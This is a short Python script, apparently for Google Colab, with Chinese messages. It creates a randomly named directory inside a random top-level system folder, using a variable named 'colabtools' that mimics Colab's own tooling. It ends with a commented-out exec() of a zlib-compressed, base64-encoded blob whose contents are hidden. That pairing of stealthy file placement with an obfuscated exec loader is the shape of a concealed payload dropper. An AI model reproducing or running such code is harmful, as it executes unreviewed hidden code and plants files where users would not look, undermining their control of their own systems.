import os
import random
import string
target_dir="/"
subdirs=[name for name in os.listdir(target_dir)if os.path.isdir(os.path.join(target_dir,name))and name!="content"and name!="proc"and name!="sys"]
random_dir=random.choice(subdirs)
def generate_random_string(length):
 letters=string.ascii_letters+string.digits
 return ''.join(random.choice(letters)for _ in range(length))
colabtools=generate_random_string(6)
if subdirs:
 random_dir=random.choice(subdirs)
else:
 print("目录下没有满足条件的子目录。")
dir=f"/{random_dir}/{colabtools}"
print(f"您的路径指定为{dir}")
del subdirs,random_dir,colabtools
os.mkdir(dir)
#import zlib, base64
#exec(zlib.decompress(base64.b64decode('eJyFUrFOwzAQ3f0VwUtjUbUbA1K+BKEoTS6pIbEj2x1QVQlVlRCCgYWlwNCNhSKBVBAV/AxN2s/ArhOlDIjt7t69d+/OplnOhXK4RNRGImARz+pMKkFZglQgElB+RIWHuxjJQU+H0jtiQQZOzIWzDSjTOp2USqVRt+EQGhsgD1S/Q6XB6uyEU7bT2DYyhGgHW8E9D4ecKWAK75RywcPdXJ5JfIys7a1DG3bCPqchuJVXgiKInQQYiECBX7Xb9dwUWKL65BA5KSgFejMLdAIZUupXxf2qGNGEKokcAWogmNNq2TV+j604xBzHN5fRcAL1JIJCngY9xXkqvT9MHRCk71bZ19b+3xBSCbox13Tl4vXdvPi8Xb1flS+z8v6yXM42i9fyYbZaLtbTSfF0Yxu+z8dYH0erxrg7bIaMusPG4wgjqxrjcvyo6Zu35+JrUl5fFPPp6v1jaAhGBtLacbuRajdCSL98dmq+gPkX6AcS1/3X')))
# Created by pyminifier (https://github.com/dzhuang/pyminifier3)
